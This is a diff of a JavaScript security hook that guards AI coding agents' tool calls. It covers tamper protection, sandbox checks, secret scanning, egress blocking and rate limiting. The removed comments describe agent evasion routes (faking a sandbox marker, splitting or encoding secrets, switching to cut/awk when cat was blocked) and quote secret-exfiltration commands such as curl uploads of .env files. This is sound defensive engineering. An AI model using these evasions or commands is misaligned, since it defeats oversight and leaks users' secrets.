-    // <<- allows the closing delimiter to be indented with tabs.
     if (line.replace(/^[ \t]+/, '').replace(/[ \t\r]+$/, '') === delim) return next;
     i = next;
   }
   return cmd.length;
 }
 
-// argsInvokeCLI reports whether any command field in a tool call runs the CLI.
-// ON THE RAW COMMAND, WHICH IS WHY THIS DOES NOT LIVE WITH THE RULES ABOVE.
-//
-// Every other tamper rule reads the NORMALISED command, and normalising strips
-// quoting, which is right for them, because a path is the same path whether or not
-// somebody quoted it. This check cannot use it. Two signals it depends on are
-// destroyed by the time the normalised text arrives:
-//
-//   <<'EOF'   becomes   <<EOF
-//
-// and a heredoc's quoting is the entire difference between a body that is text and a
-// body the shell expands. Reading the stripped form, the installer's own usage text,
-// a quoted heredoc with the product named in a markdown code span, looked like a
-// command substitution, and writing that file was a blocked tool call.
-//
-// So this runs on the field values as the caller sent them.
 function argsInvokeCLI(args) {
   if (!args || typeof args !== 'object') return false;
   for (const k of Object.keys(args)) {
@@ -1633,44 +783,24 @@ function argsInvokeCLI(args) {
   return false;
 }
 
-// The same fields the policy evaluator treats as commands. Named here rather than
-// imported because a copy that drifts is a rule that stops seeing a whole class of
-// tool call. The conformance suite used to drive both lists and catch exactly
-// that. It is gone, so this copy and the evaluator's are kept level by reading
-// them.
 const CLI_COMMAND_FIELDS = new Set(['command', 'cmd', 'function', 'script', 'shell']);
 
-// fieldsInvokeCLI decides whether one command's token list runs the CLI.
 function fieldsInvokeCLI(fields, depth) {
   let wrapped = false;
   for (let i = 0; i < fields.length; i++) {
     const tok = fields[i].replace(/^[(){}"']+/, '').replace(/[(){}"']+$/, '');
     if (!tok) continue;
     if (CLI_ASSIGNMENT.test(tok)) {
-      wrapped = true; // environment, and the program is further along
+      wrapped = true;
       continue;
     }
     if (wrapped) {
-      // A wrapper's own flags and operands are not the program it runs.
       if (tok.startsWith('-')) {
         if (CLI_FLAG_TAKES_VALUE.has(tok.toLowerCase())) i++;
         continue;
       }
       if (CLI_NUMBERISH.test(tok)) continue;
     }
-    // A WRAPPER'S QUOTED ARGUMENT IS A COMMAND, and now that this reads the raw text
-    // rather than the normalised one, it arrives whole:
-    //
-    //   bash -c "solongate policy delete"
-    //
-    // splits to `bash`, `-c`, and the single token `solongate policy delete`, because
-    // the quotes keep the spaces. Its basename is the whole string and matches nothing.
-    // While the quotes were being stripped upstream this worked by accident; on the raw
-    // text it has to be done on purpose.
-    //
-    // Only after a wrapper, which is what keeps it from being a substring rule wearing
-    // a disguise: `git commit -m "fix the solongate docs"` stops at `git` and never
-    // looks inside the message, and so does `sudo git commit -m "…"`.
     if (wrapped && depth < 8 && /[ \t]/.test(tok)) {
       if (commandInvokesCLIDepth(tok, depth + 1)) return true;
     }
@@ -1680,36 +810,21 @@ function fieldsInvokeCLI(fields, depth) {
     if (CLI_BASENAMES.has(base)) return true;
     if (CLI_ALWAYS_RUNNERS.has(base)) return restRunsCLIPackage(fields.slice(i + 1));
     if (CLI_MAYBE_RUNNERS.has(base)) return maybeRunnerRunsCLI(fields.slice(i + 1));
-    // AN UNQUOTED PATH SPLITS ON ITS OWN SPACES. `C:\\Program Files\\SolonGate\\solongate
-    // policy delete` arrives (quotes already normalised away) as the tokens `C:\\Program`
-    // and `Files\\SolonGate\\solongate`, and stopping at the first of them misses the
-    // second, where the program name actually is.
-    //
-    // So a PATH-SHAPED token is not the end of the scan. The continuation stops at the
-    // first token that is not path-shaped, which is what keeps it narrow:
-    // `/usr/bin/git commit -m "fix the solongate docs"` stops at `commit`, and
-    // `./scripts/build.sh solongate` stops at its argument rather than reading it as a
-    // program.
     if (/[/\\]/.test(tok)) continue;
-    // An ordinary program. Its arguments are its own business, and that is what keeps
-    // `git commit -m "fix the solongate docs"` running.
     return false;
   }
   return false;
 }
 
-// maybeRunnerRunsCLI looks past a package manager's flags for the subcommand that decides
-// whether anything is being run at all.
 function maybeRunnerRunsCLI(rest) {
   for (let j = 0; j < rest.length; j++) {
     if (rest[j].startsWith('-')) continue;
     if (CLI_RUN_SUBCOMMANDS.has(rest[j].toLowerCase())) return restRunsCLIPackage(rest.slice(j + 1));
-    return false; // install, add, view, naming the package is not running it
+    return false;
   }
   return false;
 }
 
-// restRunsCLIPackage reports whether a runner was pointed at this product.
 function restRunsCLIPackage(rest) {
   return rest.some((t) => {
     const tl = t.toLowerCase();
@@ -1728,9 +843,7 @@ function commandTargetsProtected(cmd) {
   if (/\.solongate[\\/]+bin/.test(c)) return 'solongate-bin';
   if (/\.codex[\\/]+(hooks\.json|config\.toml)/.test(c)) return 'codex-hooks';
   if (/\.gemini[\\/]+config[\\/]+hooks\.json/.test(c)) return 'antigravity-hooks';
-  // Customer install dirs
   if (/[\\/]solongate[\\/]+(compose|data|images|helm)[\\/]/.test(c)) return 'solongate-install';
-  // Mutating API calls against policies / audit-logs endpoints
   const mutating = /\b(post|put|delete|patch)\b/.test(c) ||
                    /(-x|--request|-method)\s+(post|put|delete|patch)\b/.test(c);
   if (mutating && /api\/v1\/(policies|audit-logs)/.test(c)) return 'api-policies-mutation';
@@ -1756,9 +869,6 @@ function extractTargetPaths(args) {
   return out;
 }
 
-// Does this tool run a command, as opposed to naming a file? Two layers ask,
-// tamper protection and the user's protected paths, and they have to answer the
-// same, so there is one copy of the question.
 function toolIsExec(toolName) {
   const tn = String(toolName || '').toLowerCase();
   return TAMPER_GUARD_TOOLS_EXEC.has(tn) || /bash|shell|exec|powershell|cmd|run|eval/.test(tn);
@@ -1766,13 +876,6 @@ function toolIsExec(toolName) {
 
 function tamperCheck(toolName, args) {
   const isExec = toolIsExec(toolName);
-  // ANY tool that targets a protected path is blocked. READ as well as write.
-  // An AI must not even read SolonGate's own protection files. This is enforced
-  // at the tool boundary; the hooks themselves are run by node directly (not via
-  // a Claude Code tool), so node still loads/executes them normally.
-  // Check the tool's TARGET PATH fields only (file_path, path, …), never the
-  // free-form content/body, which would false-positive on any file that merely
-  // mentions a protected path in its text.
   for (const p of extractTargetPaths(args)) {
     const hit = isProtectedPath(p);
     if (hit) return 'Tamper protection: access to "' + p + '" is blocked (protected: ' + hit + ')';
@@ -1789,38 +892,12 @@ function tamperCheck(toolName, args) {
   return null;
 }
 
-// ── The user's own protected paths ───────────────────────────────────────────
-// SEPARATE FROM TAMPER PROTECTION ON PURPOSE, and packages/guard/protected.go
-// says the same thing. Self-protection keeps the guard armed and a person is
-// allowed to switch it off; this list is a promise somebody made about their own
-// files, and switching off the first must not quietly cancel the second. So
-// neither check below sits behind selfProtectEnabled.
-//
-// AND IT IS THE WEAKEST OF THE THREE THINGS HOLDING THAT PROMISE. It reads the
-// strings in a tool call, so it catches `rm game.c` and does not catch
-// `x=gam; y=e; rm "$x$y.c"`, a script written to /tmp and then run, or a program
-// the agent compiles that calls unlink itself. Not a gap to close by adding
-// patterns: the ways to name a file without typing its name do not run out. It
-// is closed by the OS lock `solongate protect` puts on the file and the sandbox
-// `solongate run` puts around the agent, and this layer's job is to refuse the
-// easy case immediately, with a reason a person can read.
-//
-// Which is why its absence here mattered more than it looks. The machines that
-// run THIS implementation are the ones with no Go binary, and on unprivileged
-// Linux `protect` cannot get `chattr +i`, so it falls back to `chmod 0444`, a
-// mode that stops a write and does not stop a delete. There, this check was the
-// only thing between the agent and `rm`, and it was the half that was missing.
 
-// underProtected reports which protected path covers raw: the path itself, or
-// anything inside it when it is a directory.
 function underProtected(raw, norm) {
   const s = String(raw || '').trim();
   if (!s) return '';
   const np = normTamperPath(normalize(s));
   for (const p of norm) {
-    // `+ '/'` rather than a bare prefix, so protecting /home/me/game does not
-    // also swallow /home/me/game-notes. The rule isProtectedPath applies to the
-    // hooks directory, for the same reason.
     if (np === p || np.startsWith(p + '/')) return p;
   }
   return '';
@@ -1834,11 +911,6 @@ function protectedReason(named, hit) {
     '", which cannot be read, written or deleted by an agent';
 }
 
-// userProtectedCheck returns the deny reason, or null when the call names none
-// of the protected paths. Kept pass-for-pass with userProtectedCheck in
-// packages/guard/protected.go: same three passes in the same order, and the same
-// two reason strings, because the reason is what the model repeats to the person
-// reading and the two must not word it differently.
 function userProtectedCheck(toolName, args, sec) {
   const list = sec && Array.isArray(sec.protectedPaths) ? sec.protectedPaths : null;
   if (!list || list.length === 0) return null;
@@ -1849,29 +921,17 @@ function userProtectedCheck(toolName, args, sec) {
   }
   if (norm.length === 0) return null;
 
-  // The TARGET fields first, which is where a well-behaved tool puts the file it
-  // is about. Never the free-form body: a note that merely mentions the path is
-  // not an attempt to open it, and refusing it would teach the user the feature
-  // is broken.
   for (const raw of extractTargetPaths(args)) {
     const hit = underProtected(raw, norm);
     if (hit) return protectedReason(raw, hit);
   }
 
-  // Then anything that looks like a path anywhere in the call, including the
-  // pieces of an exec command. extractPaths already does the tokenising and the
-  // isExec split, and sharing it means a path shape the policy layer can see is
-  // one this layer can see too.
   const isExec = toolIsExec(toolName);
   for (const raw of extractPaths(args || {}, isExec)) {
     const hit = underProtected(raw, norm);
     if (hit) return protectedReason(raw, hit);
   }
 
-  // And a plain substring sweep over the command, for the same reason
-  // commandTargetsProtected does it: a command has no argument structure this
-  // layer can trust, and the path may arrive glued to a flag or inside quotes the
-  // tokeniser split differently than the shell will.
   if (isExec) {
     for (const cmd of extractCommands(args || {})) {
       const c = normTamperPath(cmd);
@@ -1883,57 +943,9 @@ function userProtectedCheck(toolName, args, sec) {
   return null;
 }
 
-// sandboxRequired reports whether this call must be refused for arriving from an
-// agent SolonGate did not start.
-//
-// FAILS CLOSED, which is why it is opt-in. The marker is an environment variable
-// `solongate run` sets on the process it launches; every descendant inherits it,
-// and an agent started any other way does not have it. An agent could of course
-// set the variable itself, and gain nothing by it, because the variable is not
-// what confines anything. The confinement is the Landlock domain, the Seatbelt
-// profile or the restricted token, applied before the agent's first instruction
-// and not droppable by it. The marker only reports the fact.
-// sandboxRequired reports whether this call must be refused for arriving from
-// an agent SolonGate did not start.
-//
-// FAILS CLOSED, and it fails closed on a KERNEL FACT rather than on an
-// environment variable's absence.
-//
-// What this used to do: trust the marker. The argument was that an agent gains
-// nothing by setting it, because the variable confines nothing, true of the
-// confinement and false of the CHECK. The check refused on the marker's
-// ABSENCE, so an agent that exported SOLONGATE_SANDBOX was neither confined nor
-// refused. One line in a shell profile, inherited by every agent the machine
-// ever starts, and the fail-closed switch failed open. Shell profiles are not on
-// the tamper list, so nothing stopped that line being written.
-//
-// THE TWO PROBES, matching shared.VerifiedInSandbox in the Go twin exactly,
-// because which implementation judges a call depends only on whether the
-// machine has the binary:
-//
-//   box  /proc/1/comm is the box's own init. A mount namespace gives the
-//        process its own /proc, in which PID 1 is bwrap rather than the host's
-//        systemd. Faking it means being PID 1 in a namespace, which means
-//        being in one, and a namespace an agent built for itself grants it
-//        nothing it did not already have.
-//
-//   run  a protected path cannot be opened for reading. Outside the Landlock
-//        domain it can: `solongate protect` locks against writing and deleting,
-//        and both chattr +i and chmod 0444 leave a file readable. Inside, the
-//        path has no rule and open() returns EACCES. A successful read is proof
-//        the confinement is not on, which is the direction that matters.
-//
-// AN INCONCLUSIVE ANSWER IS A REFUSAL. "I could not tell" and "it is confined"
-// are different sentences, and only one of them should let a call through on a
-// machine whose owner asked for confinement to be mandatory. `run` with no
-// protected paths is the case that lands there, and it says so rather than
-// printing the generic line.
 function sandboxVerified(sec) {
   const marker = String(process.env.SOLONGATE_SANDBOX || '');
   if (marker === '') return { confined: false, conclusive: true };
-  // Everything before the colon is the mode. A marker from a build that wrote
-  // only a version is read as `run`, the weaker of the two and so the safe
-  // reading.
   const mode = marker.includes(':') ? marker.slice(0, marker.indexOf(':')) : 'run';
 
   if (mode === 'box') {
@@ -1955,11 +967,9 @@ function sandboxVerified(sec) {
     if (!pth) continue;
     try {
       accessSync(pth, constants.R_OK);
-      // Readable, so nothing stands between this process and a path somebody
-      // protected. The marker is a lie.
       return { confined: false, conclusive: true };
     } catch (e) {
-      if (e && e.code === 'ENOENT') continue; // nothing to learn from an absent path
+      if (e && e.code === 'ENOENT') continue;
       return { confined: true, conclusive: true };
     }
   }
@@ -1985,76 +995,34 @@ function sandboxRequired(sec) {
     'and by string matching anywhere else.';
 }
 
-// ── Extra security layers (rate limit, egress allowlist, DLP block) ──
-// These are configured per-project in the dashboard and delivered to the guard
-// via /policies/active (security). All fail OPEN: any error here returns null
-// (allow) so a config glitch never bricks the agent. Tamper protection and
-// policy are unaffected and still run.
 
-// THE PATTERN LIST LIVES IN ./dlp.mjs, one copy for the three hooks that scan.
-//
-// Each of them carried its own, and they had drifted: the guard had 70 and each hook had
-// 14, so on a machine without the Go binary, which is the default, a policy asking for
-// most of the list was enforcing nothing. Compiled here with the flags THIS hook needs:
-// no `g`, because this only TESTS for a match and a `g` regex carries
-// `lastIndex` between calls, which on a reused object silently skips matches.
 const DLP_PATTERNS = dlpPatterns('');
 
-// dlpGlobCollapse lived here, the regexp that collapses a run of stars. It is in
-// ./dlp.mjs with the converter that uses it.
 
-// DLP_MAX_FILE_BYTES is the ceiling on any file this hook opens to scan.
-//
-// Every one of those paths comes from the AGENT, a file it asked to read, or one
-// it named in a transfer command, so the size is the agent's choice and the
-// ceiling is what keeps it from being this process's memory footprint. Scanning
-// also builds de-obfuscated VIEWS of the text, so the peak is a multiple of the
-// file.
-//
-// The number was already written three times as a literal and missing from a
-// fourth place that needed it; it lives here now so the four cannot drift.
-// Mirrors dlpMaxFileBytes in the Go guard.
 const DLP_MAX_FILE_BYTES = 1048576;
 
-// dlpGlobToRe is in ./dlp.mjs too: three copies of one converter, and the reason it
-// collapses a run of stars is a HANG on a pattern somebody types.
-// De-obfuscated VIEWS of the scanned text, so an agent can't smuggle a secret
-// past the literal patterns by SPLITTING it (printf "AKIA""3XZ9…") or ENCODING it
-// (echo <base64> | base64 -d). We scan every view. Not exhaustive, pattern DLP
-// can never be, but it closes the two obvious bypasses.
 function dlpViews(text) {
   const views = [text];
   try {
-    // 1) Drop shell quotes + backslashes so a split secret collapses back to a
-    //    contiguous run: "AKIA""3XZ9…" / 'AKIA'\''…' / AKIA\3XZ9 → AKIA3XZ9…
     const dequoted = text.replace(/[`'"\\]/g, '');
     if (dequoted !== text) views.push(dequoted);
-    // 2) Decode base64-looking tokens (from both the raw and the dequoted view,
-    //    the payload itself may be split too) and scan the decoded bytes.
     const src = dequoted !== text ? text + '\n' + dequoted : text;
     const toks = src.match(/[A-Za-z0-9+/]{16,}={0,2}/g) || [];
     let decoded = '';
     for (const t of toks.slice(0, 60)) {
       try {
         const d = Buffer.from(t, 'base64').toString('latin1');
-        if (/[ -~]{8,}/.test(d)) decoded += d + '\n'; // keep printable decodes only
-      } catch { /* not base64 */ }
+        if (/[ -~]{8,}/.test(d)) decoded += d + '\n';
+      } catch {  }
     }
     if (decoded) views.push(decoded);
-  } catch { /* fall back to the raw view */ }
+  } catch {  }
   return views;
 }
-// Scan args against the enabled built-in patterns + any user custom patterns.
-// `cfg` = { patterns: string[], custom: {name,re}[] }.
 function dlpScan(args, cfg) {
   if (!cfg) return null;
   let text = '';
   try { text = JSON.stringify(args || {}); } catch { return null; }
-  // Content that's ALREADY been redacted must not re-trigger DLP, otherwise you
-  // can't write a report / save a diff / paste a ticket containing masked output
-  // (the `[REDACTED:name]` marker can itself contain a pattern name that matches).
-  // Strip those markers before scanning so a safe, masked value is never treated
-  // as a live secret.
   text = text.replace(/\[REDACTED:[^\]]*\]/g, '');
   const views = dlpViews(text);
   const allow = new Set(Array.isArray(cfg.patterns) ? cfg.patterns : []);
@@ -2062,38 +1030,21 @@ function dlpScan(args, cfg) {
     if (allow.has(p.name) && views.some((v) => p.re.test(v))) return p.name;
   }
   for (const c of Array.isArray(cfg.custom) ? cfg.custom : []) {
-    try { const re = dlpGlobToRe(c.re); if (views.some((v) => re.test(v))) return c.name || 'custom pattern'; } catch { /* skip invalid */ }
+    try { const re = dlpGlobToRe(c.re); if (views.some((v) => re.test(v))) return c.name || 'custom pattern'; } catch {  }
   }
   return null;
 }
 
-// Egress DLP: pattern DLP scans tool ARGUMENTS + tool OUTPUT, but a command like
-// `curl --data-binary @.env <url>` reads the file ITSELF, the secret never
-// appears in an argument or a tool result, so plain DLP misses it. Here, when a
-// downloader/transfer command SENDS to an external host, we read the local files
-// it would upload and scan THEM; a hit blocks the call. Only runs when DLP block
-// is configured, and only for transfer commands (rare), so the extra file read
-// is off the common hot path.
 function egressSecretCheck(args, sec, cwd) {
   try {
     const dlp = sec && sec.dlpBlock;
     if (!dlp) return null;
-    // Resolve the files a transfer command reads relative to the AGENT's cwd, not
-    // the guard process's cwd. On Antigravity the hook runs with cwd set to the
-    // hooks.json directory (~/.gemini/config), so a bare `resolve('config/x')`
-    // would look in the wrong place and the egress check would silently miss.
     const base = cwd || process.cwd();
-    // PIPELINES, not commands. extractCommands splits on `|` too, which is right for
-    // a policy rule and wrong here: `cat creds.env | curl -d @- https://…` split into
-    // a half with no transfer command and a half whose only file is `-`, so a secret
-    // piped into an upload was seen by neither. Both implementations had it.
     for (const cmd of extractPipelines(args)) {
       const c = String(cmd || '');
       const lc = c.toLowerCase();
       if (!/\b(curl|wget|scp|rsync|sftp|ftp|nc|netcat)\b/.test(lc)) continue;
-      // Must actually send OUTWARD: an http(s) URL or a host:path target.
       if (!/https?:\/\//.test(lc) && !/@[\w.-]+:/.test(c) && !/\b\S+:\S/.test(c)) continue;
-      // Local files the command reads to send (@file, -d/-T/--data* @file, cat, <).
       const files = new Set();
       let m;
       for (const re of [
@@ -2107,15 +1058,10 @@ function egressSecretCheck(args, sec, cwd) {
           if (f && f !== '-' && !/^https?:\/\//.test(f) && !/^[@{[]/.test(f)) files.add(f);
         }
       }
-      // POSITIONAL sources, for the transfers that take them: `scp creds.env
-      // user@host:/tmp/x` names its file with no flag in front of it, so none of the
-      // regexes above saw it and the commonest way to copy a file off a machine went
-      // unchecked. Every token that could be a path is a candidate; what decides is
-      // still the content scan below, and a token that is not a file fails the stat.
       if (/\b(scp|rsync|sftp)\b/.test(lc)) {
         for (const tok of c.split(/\s+/).slice(1)) {
-          if (!tok || tok.startsWith('-')) continue;      // a flag
-          if (/^[\w.-]*@?[\w.-]+:/.test(tok)) continue;    // user@host:path, the DESTINATION
+          if (!tok || tok.startsWith('-')) continue;
+          if (/^[\w.-]*@?[\w.-]+:/.test(tok)) continue;
           if (/^https?:\/\//.test(tok)) continue;
           files.add(tok.replace(/^@/, ''));
         }
@@ -2124,21 +1070,6 @@ function egressSecretCheck(args, sec, cwd) {
         if (f.startsWith('~')) f = homedir() + f.slice(1);
         let abs; try { abs = isAbsolute(f) ? f : resolve(base, f); } catch { continue; }
         let content = null;
-        // STAT BEFORE READ, and skip anything over the scan ceiling.
-        //
-        // The path is one the AGENT put in a transfer command, so its size is the
-        // agent's choice. Reading it whole meant `curl -T big.bin` made this hook
-        // allocate the whole file, and then dlpScan builds de-obfuscated VIEWS of
-        // it, so the peak is a multiple of that. The guard runs before every tool
-        // call and is fail-closed, so an out-of-memory kill here is a stalled
-        // agent rather than a missed scan.
-        //
-        // One megabyte is not a new rule: it is DLP_MAX_FILE_BYTES, already the
-        // ceiling on the read-redaction path and on dlpReadCheck. Only this one
-        // spot was missing it. The trade is explicit, a secret in a file over the
-        // ceiling is not caught HERE, and it is the trade the other two paths
-        // already made, which is the reason to make it the same rather than
-        // inventing a second answer.
         try {
           const st = statSync(abs);
           if (!st.isFile() || st.size > DLP_MAX_FILE_BYTES) continue;
@@ -2149,12 +1080,10 @@ function egressSecretCheck(args, sec, cwd) {
         if (hit) return 'DLP: outbound transfer of "' + f + '" is blocked - it contains a ' + hit + ' (egress protection)';
       }
     }
-  } catch { /* fail open, never break a legitimate command on a scan error */ }
+  } catch {  }
   return null;
 }
 
-// Mask every enabled secret in `text` as `[REDACTED:name]` (mirrors audit.mjs's
-// output redaction so Antigravity gets the SAME masking Claude does).
 function dlpRedactText(text, cfg) {
   if (!cfg || typeof text !== 'string') return text;
   let out = text;
@@ -2170,21 +1099,11 @@ function dlpRedactText(text, cfg) {
   return out;
 }
 
-// Antigravity read redaction via `overwrite` (hooks.md): agy can't rewrite tool
-// OUTPUT, but it CAN rewrite the tool's ARGS before it runs. So when a read would
-// surface a secret file, we write a REDACTED copy to a temp path and point the
-// read at that copy, the agent sees `[REDACTED:…]` exactly like on Claude, no
-// block needed. Works for the native read tool (swap the path arg) and shell
-// reads (swap the file token in the command). FAIL-CLOSED: any uncertainty →
-// `{block:true}` so a secret can never leak through a redaction that didn't apply.
 function dlpRedactReadPlan(toolName, args, dlp, cwd) {
   try {
     if (!dlp || !args) return null;
     const base = cwd || process.cwd();
     const abends = (f) => { let x = f; if (x.startsWith('~')) x = homedir() + x.slice(1); return isAbsolute(x) ? x : resolve(base, x); };
-    // Returns: 'SKIP' (not a readable file / too big) · 'CLEAN' (readable, no
-    // secret) · a temp path (redacted copy written) · 'FAILED' (has a secret but
-    // the copy couldn't be written → caller must BLOCK, never leak).
     const redactCopy = (abs) => {
       let content;
       try { const st = statSync(abs); if (!st.isFile() || st.size > DLP_MAX_FILE_BYTES) return 'SKIP'; content = readFileSync(abs, 'utf-8'); } catch { return 'SKIP'; }
@@ -2197,9 +1116,6 @@ function dlpRedactReadPlan(toolName, args, dlp, cwd) {
         return tmp;
       } catch { return 'FAILED'; }
     };
-    // Native read tool: scan EVERY string arg that looks like a path (so an
-    // unfamiliar arg name can't slip a secret file through), swap the one that is
-    // a secret file for its redacted copy.
     for (const [k, v] of Object.entries(args)) {
       if (k === 'command' || typeof v !== 'string' || !v || !/[./]/.test(v)) continue;
       const r = redactCopy(abends(v));
@@ -2207,37 +1123,21 @@ function dlpRedactReadPlan(toolName, args, dlp, cwd) {
       if (r === 'FAILED') return { block: true };
       return { rewrite: { [k]: r } };
     }
-    // Expand a shell glob token (`staging.e*`, `prod-*.txt`) to the real files it
-    // matches in that ONE directory. Globs are the classic redaction dodge: the
-    // filename rule can't match `staging.e*` against `*.env`, and a redacted-copy
-    // swap can't statSync a path with a literal `*` in it, so a bare
-    // `cat staging.e*` would read the secret unredacted. Expanding here closes it.
     const GLOB_META = /[*?\[]/;
     const expandGlob = (absGlob) => {
       try {
         const dir = dirname(absGlob);
         const base = absGlob.slice(dir.length + 1);
         if (!GLOB_META.test(base)) return [absGlob];
-        // Runs of `*` collapsed first: the token is the agent's, and adjacent
-        // `[^/]*` groups backtrack catastrophically. Same reasoning as
-        // expandCommandGlobs, which this mirrors.
         const re = new RegExp('^' + base.replace(/\*{2,}/g, '*').replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '[^/]*').replace(/\?/g, '[^/]') + '$');
         return readdirSync(dir).filter((f) => re.test(f)).map((f) => join(dir, f));
       } catch { return []; }
     };
-    // Shell read command: swap each secret file token for its redacted copy.
-    // The command list is broad on purpose: agy can't redact tool OUTPUT, so any
-    // text-processing tool that can print a file's contents is a redaction dodge
-    // if it's missing here (the model reached for `cut`/`awk` the moment `cat` was
-    // blocked). Enumerating every reader is a losing game (python -c, $(<f), while
-    // read, …); this covers the common ones and the glob path below fails closed.
     const cmd = typeof args.command === 'string' ? args.command : '';
     if (cmd && /\b(cat|less|more|head|tail|bat|nl|od|xxd|hexdump|strings|grep|egrep|fgrep|rg|ag|cut|awk|gawk|sed|tr|sort|uniq|paste|join|comm|column|fold|tac|rev|pr|expand|unexpand|base64|base32|dd|mapfile|readarray)\b/.test(cmd.toLowerCase())) {
       let newCmd = cmd, changed = false;
       for (const tok of cmd.split(/[\s'"|<>;&()]+/)) {
         if (!tok || tok.startsWith('-') || !/[./]/.test(tok)) continue;
-        // A glob can't be swapped for a single redacted copy, expand it and, if
-        // ANY matched file holds a secret, BLOCK the whole read (fail-closed).
         if (GLOB_META.test(tok)) {
           for (const f of expandGlob(abends(tok))) {
             const rg = redactCopy(f);
@@ -2252,16 +1152,10 @@ function dlpRedactReadPlan(toolName, args, dlp, cwd) {
       }
       if (changed) return { rewrite: { command: newCmd } };
     }
-  } catch { return { block: true }; } // fail-closed: never leak on an error
+  } catch { return { block: true }; }
   return null;
 }
 
-// DLP read-block for Antigravity ONLY. On Claude Code a secret in a file the
-// agent reads is REDACTED by the PostToolUse audit hook. Antigravity runs no
-// PostToolUse hook and its PreToolUse can't rewrite output, so redaction is
-// impossible there, the only enforcement left is to DENY the read outright.
-// So when DLP block is on, read the file the tool would surface and, if it holds
-// a secret, block the call. Bounded (≤1MB) and gated to agy + read-ish tools.
 function dlpReadCheck(args, dlp, cwd) {
   try {
     if (!dlp) return null;
@@ -2284,97 +1178,43 @@ function dlpReadCheck(args, dlp, cwd) {
       const hit = dlpScan(content, dlp);
       if (hit) return 'Security layer (DLP): reading "' + f + '" is blocked, it contains a ' + hit + '. Blocked by SolonGate.';
     }
-  } catch { /* fail open */ }
+  } catch {  }
   return null;
 }
 
-// Strip shell decoration from a token so it can be tested as a path:
-// surrounding quotes, redirection operators, trailing punctuation.
 function cleanShellToken(tok) {
   let t = String(tok || '').trim();
   t = t.replace(/^[<>|;&(]+/, '').replace(/[);&|]+$/, '');
   t = t.replace(/^['"]+/, '').replace(/['"]+$/, '');
-  t = t.replace(/^\d*>>?/, ''); // strip leading redirection like 2>
+  t = t.replace(/^\d*>>?/, '');
   return t.trim();
 }
 
-// Multi-window sliding rate limit, persisted under ~/.solongate (tamper-protected
-// from the agent, writable by the guard). One timestamps file per agent, pruned
-// to the last 24h and capped for performance; counts this agent's calls within
-// each enabled window (minute/hour/day). Returns the exceeded window or null.
 const RL_WINDOWS = [
   { key: 'perDay', ms: 86400000, label: 'day' },
   { key: 'perHour', ms: 3600000, label: 'hour' },
   { key: 'perMinute', ms: 60000, label: 'minute' },
 ];
-// One call = one fixed-width record, appended: 13 digits of epoch ms, a 10
-// character token that belongs to this call alone, and a newline. Fixed width is
-// what lets the file be read by offset without parsing it all.
-//
-// THE TOKEN IS WHAT MAKES THE COUNT EXACT. See rateLimitCheck.
 const RL_STAMP = 13;
 const RL_TOKEN = 10;
 const RL_REC = RL_STAMP + RL_TOKEN + 1;
-const RL_MAX_READ = 1_048_576; // tail we scan: ~43k calls, far past any window
-const RL_MAX_FILE = 4_194_304; // compact past this
+const RL_MAX_READ = 1_048_576;
+const RL_MAX_FILE = 4_194_304;
 
-// This call's identity in the log. Random rather than pid-based: a burst is
-// often one parent spawning many children, and two of them starting in the same
-// millisecond with the same parent would otherwise collide.
 function rlNewToken() {
   try {
     return randomBytes(RL_TOKEN / 2).toString('hex');
   } catch {
-    // Never hand out a free call because entropy was unavailable. A constant
-    // token degrades this to the old count-everything behaviour, which is
-    // conservative, rather than to no limit at all.
     return '0'.repeat(RL_TOKEN);
   }
 }
 
-/**
- * Rate limit, counted with an append-only log.
- *
- * This used to read a JSON array of timestamps, count, push one and write the
- * whole array back. Under a burst of parallel tool calls, the exact thing a
- * rate limit is for, every hook read the same array and wrote back its own
- * copy, so increments were lost and the limit did not hold: measured at 14
- * calls through a limit of 5, from 30 fired at once.
- *
- * An O_APPEND write of a short record does not interleave, so no call can erase
- * another's, and the reservation is made BEFORE the decision.
- *
- * THE DECISION IS THIS CALL'S POSITION, NOT THE TOTAL. Appending and then
- * counting everything in the window was the first fix, and it held the ceiling
- * but not the floor: thirty processes append at once, and whichever one gets
- * around to counting last sees all thirty and refuses itself, even though it was
- * among the first five to reserve. How many got through depended on the
- * interleaving. Measured: a limit of 5 let 3 through on a loaded machine, and the
- * conformance case that asserts a useful number gets through failed on a run
- * where nothing had changed.
- *
- * So each record carries a token, and a call is allowed when fewer than `limit`
- * records inside the window sit AHEAD OF ITS OWN. The log is totally ordered by
- * position, so every process computes the same answer whenever it happens to
- * look: exactly the first `limit` records in a window are allowed, and the rest
- * are not.
- *
- * A refused call still occupies a slot, which is the honest reading: thirty
- * attempts in a minute IS thirty calls a minute, whatever came back.
- */
 function rateLimitCheck(agentKey, limits) {
   try {
     const dir = resolve(homedir(), '.solongate');
-    // New name: the old .json holds an array this format cannot read, and one
-    // window resetting on upgrade is better than parsing ambiguity.
-    // `.v2` because the record width changed. An older file parsed at this stride
-    // yields timestamps the day filter throws away, which is an empty window,
-    // which is an allow: the one upgrade behaviour this must not have.
     const file = join(dir, '.ratelimit-' + agentKey + '.v2.log');
     const now = Date.now();
     try { mkdirSync(dir, { recursive: true }); } catch {}
-    // Reserve first. A failed append must not hand out a free call, so treat it
-    // as "cannot account for this" and fall open the same way the catch does.
     const token = rlNewToken();
     try {
       appendFileSync(file, String(now).padStart(RL_STAMP, '0') + token + '\n');
@@ -2383,7 +1223,6 @@ function rateLimitCheck(agentKey, limits) {
     let size = 0;
     try { size = statSync(file).size; } catch { return null; }
     const start = Math.max(0, size - RL_MAX_READ);
-    // Align to a record boundary so a truncated head is never parsed.
     const from = start - (start % RL_REC);
     let buf = '';
     try {
@@ -2408,41 +1247,27 @@ function rateLimitCheck(agentKey, limits) {
       const limit = limits[w.key];
       if (!(limit > 0)) continue;
       if (mine >= 0) {
-        // How many are ahead of us inside this window.
         const ahead = entries.slice(0, mine).reduce((n, e) => (now - e.ms < w.ms ? n + 1 : n), 0);
         if (ahead >= limit) return { window: w.label, limit };
         continue;
       }
-      // Our own record is not in the tail we read, which means the file was
-      // compacted or truncated under us. Fall back to counting everything in the
-      // window, ourselves included, and cross the limit at > rather than >=.
-      // Conservative, and the behaviour this had before.
       const count = entries.reduce((n, e) => (now - e.ms < w.ms ? n + 1 : n), 0);
       if (count > limit) return { window: w.label, limit };
     }
 
-    // Compaction, rarely: keep the last 24h. Written beside and renamed, so a
-    // reader never sees a half-written file. An append landing during the swap
-    // is lost, which costs one call of accuracy on a file this size.
     if (size > RL_MAX_FILE) {
       try {
         const tmp = file + '.' + process.pid + '.tmp';
